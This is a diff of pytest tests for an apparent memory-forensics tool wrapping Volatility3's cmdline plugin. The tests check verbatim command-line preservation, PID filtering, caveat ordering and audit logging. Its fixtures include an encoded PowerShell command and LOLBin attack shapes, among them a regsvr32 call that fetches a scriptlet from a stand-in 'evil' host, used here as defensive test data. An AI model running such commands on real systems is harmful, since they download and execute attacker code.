@@ -95,8 +95,9 @@ def test_cmdline_typical_powershell_invocation_parses(
     Args round-trips verbatim. The LOLBin caveat documents the
     follow-up; the type layer preserves the citation span."""
     encoded = "JABjAD0AKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AaQBvAC8AeAAuAGUAeABlACcAKQ=="
+    cmdline = f"powershell.exe -enc {encoded}"
     rows = [
-        _row(1234, "powershell.exe", f"powershell.exe -enc {encoded}"),
+        _row(1234, "powershell.exe", cmdline),
         _row(5678, "explorer.exe", "C:\\Windows\\Explorer.EXE"),
     ]
     _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
@@ -107,50 +108,32 @@ def test_cmdline_typical_powershell_invocation_parses(
     ps = envelope.data.entries[0]
     assert ps.pid == 1234
     assert ps.process == "powershell.exe"
-    assert ps.args is not None
-    assert encoded in ps.args  # verbatim — entity gate matches cited spans
+    # Byte-identical equality: catches end-truncation, prefix-strip,
+    # canonicalisation, AND case-fold regressions — `in` would miss
+    # the first three.
+    assert ps.args == cmdline
 
 
-@pytest.mark.parametrize(
-    "args_value",
-    [
-        None,
-        "",
-        "null",  # JSON-stringy null — Vol3 occasionally emits literal
-        "Required memory at 0x7ffe4dc8 is not valid (process exited?)",
-    ],
-)
-def test_cmdline_empty_or_paged_out_args_normalised_to_none(
-    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
-    monkeypatch: pytest.MonkeyPatch,
-    args_value: object,
-) -> None:
-    """Story BDD §48-51: System (PID 4), Registry, smss.exe, and
-    paged-out PEBs all surface as Args=None. The forensic invariant
-    is that ``args is None`` honestly means "no string available" —
-    not the literal string "null", not a smear-artifact placeholder."""
-    rows = [_row(4, "System", args_value)]
-    _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
-    envelope = _invoke(env)
-    assert envelope.success is True
-    assert envelope.data.entries[0].pid == 4
-    assert envelope.data.entries[0].args is None
+# Args-normalisation matrix lives in test_cmdline_entry.py — it tests
+# the model in isolation. This file owns the pipeline-level contracts.
 
 
 def test_cmdline_pid_filter_forwarded_to_vol3_argv(
     env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """Story BDD §43-46: ``pid=4242`` MUST surface as ``--pid 4242``
-    AFTER the plugin name in cmd_argv — Vol3-side filter is cheaper
-    than scan-then-server-filter."""
+    """``pid=4242`` MUST surface as ``--pid 4242`` immediately AFTER
+    the plugin name in cmd_argv — Vol3-side filter is cheaper than
+    scan-then-server-filter. Pin BOTH the post-plugin position AND
+    the value-immediately-after-flag adjacency (a regression that
+    flipped the order would pass a `--pid` membership check alone)."""
     calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
     envelope = _invoke(env, pid=4242)
     argv = calls[0]
-    assert "--pid" in argv
-    assert "4242" in argv
     plugin_idx = argv.index("windows.cmdline.CmdLine")
-    assert argv.index("--pid") > plugin_idx
+    pid_flag_idx = argv.index("--pid")
+    assert pid_flag_idx > plugin_idx
+    assert argv[pid_flag_idx + 1] == "4242"
     assert "--pid" in envelope.data_provenance.cmd_argv
 
 
@@ -227,19 +210,22 @@ def test_cmdline_caveats_verbatim_with_action_shaping_first(
     env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """All 5 caveats from context/domain/03 §7.12 must appear verbatim.
-    Action-shaping ("beats Sysmon EID 1") MUST appear first; tamper +
-    LOLBin + paged-out + empty-args follow in that order."""
+    """All 5 caveats appear in the prescribed order: action-shaping
+    FIRST, then tamper / LOLBin / paged-out / empty-args allowlist.
+    The Epic 10 critic agent reads caveat ORDER as priority signal,
+    so every position is pinned — a reorder of indices 1-4 would
+    silently downgrade the tamper-detection caveat below the
+    LOLBin allowlist."""
     _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
     envelope = _invoke(env)
     caveats = envelope.caveats
+    assert len(caveats) == 5
     assert "beats Sysmon EID 1" in caveats[0]
-    blob = " | ".join(caveats)
-    assert "PEB-tamper-overwritten" in blob
-    assert "RtlInitUnicodeString" in blob
-    assert "rundll32 / regsvr32 / mshta / msbuild / installutil" in blob
-    assert "PEB may be paged out" in blob
-    assert "System (PID 4), Registry, smss.exe" in blob
+    assert "PEB-tamper-overwritten" in caveats[1]
+    assert "RtlInitUnicodeString" in caveats[1]
+    assert "rundll32 / regsvr32 / mshta / msbuild / installutil" in caveats[2]
+    assert "PEB may be paged out" in caveats[3]
+    assert "System (PID 4), Registry, smss.exe" in caveats[4]
 
 
 def test_cmdline_non_int_pid_triggers_output_parse_failed(
@@ -269,3 +255,127 @@ def test_cmdline_unknown_column_triggers_output_parse_failed(
     assert envelope.success is False
     assert envelope.advisories[-1] == VolFailureReason.OUTPUT_PARSE_FAILED.value
     assert len(calls) == 1
+
+
+# ---------------------------------------------------------------------------
+# Pipeline contract — cmdline-specific regression coverage
+# ---------------------------------------------------------------------------
+
+
+def test_cmdline_normalizer_key_is_vol_cmdline_not_default(
+    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Regression: PR #142 round-1/2 found every vol_* tool shared
+    the same default normalizer key, silently breaking citation-gate
+    matching the moment any per-tool rule landed. The pipeline-level
+    contract test only exercised vol_netscan — verify the same wiring
+    holds for vol_cmdline."""
+    from silentwitness_mcp.verification import normalizer as _norm
+
+    captured: list[str] = []
+    real = _norm.normalize_output
+    monkeypatch.setattr(
+        "silentwitness_mcp.tools._vol_common.normalize_output",
+        lambda raw, tool: (captured.append(tool), real(raw, tool))[1],
+    )
+    _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
+    envelope = _invoke(env)
+    assert envelope.success is True
+    assert captured == ["vol_cmdline"]
+
+
+def test_cmdline_audit_row_tool_name_is_vol_cmdline(
+    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Audit-trail integrity: the success-path JSONL row's ``tool``
+    field MUST be ``vol_cmdline`` (not a copy-paste artefact like
+    ``vol_pslist``). Cross-tool replay reconstruction depends on it."""
+    rows = [_row(1234, "notepad.exe", "notepad.exe \\Users\\X\\note.txt")]
+    _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
+    case_dir = env[0]
+    envelope = _invoke(env)
+    assert envelope.success is True
+    audit_log = case_dir / "audit" / "memory.jsonl"
+    audit_rows = [json.loads(line) for line in audit_log.read_text("utf-8").splitlines() if line]
+    row = audit_rows[-1]
+    assert row["tool"] == "vol_cmdline"
+    assert row["audit_id"] == envelope.audit_id
+    assert row["params"]["exit_code"] == 0
+
+
+@pytest.mark.parametrize(
+    "lolbin_cmd",
+    [
+        "rundll32.exe shell32.dll,Control_RunDLL evil.cpl",
+        "regsvr32.exe /s /u /n /i:http://evil/x.sct scrobj.dll",
+        "mshta.exe javascript:alert(1)",
+        "msbuild.exe /p:Configuration=Release inline.csproj",
+        "installutil.exe /U evil.dll",
+    ],
+)
+def test_cmdline_lolbin_shapes_round_trip_verbatim(
+    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
+    monkeypatch: pytest.MonkeyPatch,
+    lolbin_cmd: str,
+) -> None:
+    """The caveat advertises rundll32/regsvr32/mshta/msbuild/installutil
+    as LOLBin red flags. Verify each shape round-trips verbatim so
+    the entity gate's cited-span match works — a future "redact
+    suspicious patterns" validator added without thought would break
+    this contract silently."""
+    rows = [_row(1234, lolbin_cmd.split()[0], lolbin_cmd)]
+    _install_mock(monkeypatch, _FakeProc(stdout=json.dumps(rows).encode("utf-8")))
+    envelope = _invoke(env)
+    assert envelope.success is True
+    assert envelope.data.entries[0].args == lolbin_cmd
+
+
+@pytest.mark.parametrize("bad_pid", [0, -1, -1234])
+def test_cmdline_invalid_pid_rejected_synchronously(
+    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
+    monkeypatch: pytest.MonkeyPatch,
+    bad_pid: int,
+) -> None:
+    """PID 0 (System Idle) and negative PIDs have no _EPROCESS / PEB —
+    Vol3 would return empty or error confusingly. Reject loudly at
+    the wrapper boundary instead so an LLM-driven typo gets a clean
+    diagnostic, not an empty success envelope."""
+    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
+    with pytest.raises(ValueError, match="pid must be >= 1"):
+        _invoke(env, pid=bad_pid)
+    # No subprocess spawn — validation is pre-flight.
+    assert calls == []
+
+
+def test_cmdline_unknown_caveat_key_fails_loud(
+    env: tuple[Path, Path, AuditLogger, EvidenceRegistry],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Catalogue typo or rename-without-registration MUST surface as
+    UnknownCaveatKeyError, not silently strip safety guidance. The
+    fail-fast check runs at _run_wrapper entry — no subprocess spawn,
+    no audit row written."""
+    from silentwitness_mcp.tools._vol_caveats import UnknownCaveatKeyError
+    from silentwitness_mcp.tools._vol_pipeline import _run_wrapper
+
+    calls = _install_mock(monkeypatch, _FakeProc(stdout=b"[]"))
+    case_dir, evidence, logger, registry = env
+    with pytest.raises(UnknownCaveatKeyError, match="cmdlne"):
+        asyncio.run(
+            _run_wrapper(
+                tool_name="vol_cmdline",
+                plugin_name="windows.cmdline.CmdLine",
+                caveat_key="cmdlne",  # deliberate typo
+                output_cls=CmdlineOutput,
+                parse_rows=lambda _raw: CmdlineOutput(entries=()),
+                evidence_path=evidence,
+                case_dir=case_dir,
+                evidence_registry=registry,
+                audit_logger=logger,
+                model_used=MODEL,
+                timeout_s=300.0,
+            )
+        )
+    assert calls == []
